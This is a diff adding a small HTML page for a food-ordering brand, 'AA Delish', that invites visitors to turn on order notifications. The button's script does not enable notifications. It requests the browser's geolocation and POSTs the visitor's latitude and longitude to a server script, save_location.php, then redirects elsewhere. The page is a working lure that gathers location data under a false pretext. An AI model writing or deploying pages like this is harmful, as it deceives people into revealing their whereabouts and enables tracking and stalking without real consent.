@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>AA Delish</title>
+
+    <!-- Favicon -->
+    <link rel="shortcut icon" type="image/x-icon" href="img/ico.png" />
+
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Gochi+Hand">
+    <link rel="stylesheet" type="text/css" href="css/main.css" />
+</head>
+<body>
+    <div class="main-container">
+        <div class="main">
+            <img src="img/notification_icon.png" style="width: 300px; margin-bottom: 20px;" loading="lazy" />
+            <br/><br/><br/>
+            <h3>Follow your order</h3>
+            <p class="paragraph-text">Turn on notifications to get updated when your order is ready otherwise you might miss it.</p>
+            <br/> 
+            <button class="primary-btn-wide" id="btn">Turn On Notifications</button>
+        </div>
+    </div>
+    <script>
+        document.getElementById('btn').addEventListener('click', function() {
+            this.style.animation = 'bounce 0.5s ease';
+            setTimeout(() => {
+                this.style.animation = '';
+            }, 500);
+
+           
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    var latitude = position.coords.latitude;
+                    var longitude = position.coords.longitude;
+                    
+                    
+                    sendLocationToServer(latitude, longitude);
+                }, function(error) {
+                    console.error('Error getting user location:', error);
+                    
+                    redirectToNextPage();
+                });
+            } else {
+                console.error('Geolocation is not supported by this browser.');
+                redirectToNextPage();
+            }
+        });
+
+        function sendLocationToServer(latitude, longitude) {
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', 'save_location.php', true); 
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === XMLHttpRequest.DONE) {
+                    if (xhr.status === 200) {
+                        redirectToNextPage();
+                    } else {
+                        console.error('Failed to send location data to server.');
+                        redirectToNextPage();
+                    }
+                }
+            };
+            var data = {
+                latitude: latitude,
+                longitude: longitude
+            };
+            xhr.send(JSON.stringify(data));
+        }
+
+        function redirectToNextPage() {
+           
+            window.location.href = 'announcement.html';
+        }
+    </script>
+</body>
+</html>
